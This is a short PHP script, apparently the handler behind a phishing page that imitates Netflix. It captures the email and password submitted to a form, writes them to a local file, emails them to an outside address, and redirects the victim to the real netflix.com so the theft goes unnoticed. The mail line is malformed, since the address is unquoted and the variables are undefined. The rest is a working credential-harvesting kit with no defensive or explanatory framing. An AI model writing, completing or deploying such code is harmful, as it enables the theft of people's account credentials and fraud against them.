<?php

file_put_contents("usernames.txt", "Account: " . $_POST['email'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
mail($filip.larsen@live.no, $fromScript,"Account: " . $_POST['email'] . " Pass: " . $_POST['password'] . "\n", $headers);
header('Location: https://netflix.com');
exit();
